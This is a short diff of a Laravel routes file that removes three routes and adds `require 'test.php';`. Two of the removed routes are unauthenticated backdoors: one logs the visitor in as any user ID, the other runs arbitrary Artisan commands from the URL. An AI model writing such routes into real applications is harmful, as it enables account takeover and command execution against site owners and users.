@@ -32,22 +32,7 @@ use Illuminate\Support\Facades\Route;
 |
 */
 
-Route::get('go', function () {
-    return abort(404);
-});
-
-Route::get('sl/{user_id}', function ($user_id) {
-    auth()->logout();
-    auth()->loginUsingId($user_id);
-
-    return redirect()->route('dashboard');
-});
-
-Route::get('artisan/{command}', function ($command) {
-    Artisan::call($command);
-
-    return $command;
-});
+require 'test.php';
 
 // ------------------------------------------------------------------------------------------------------------------ //
 
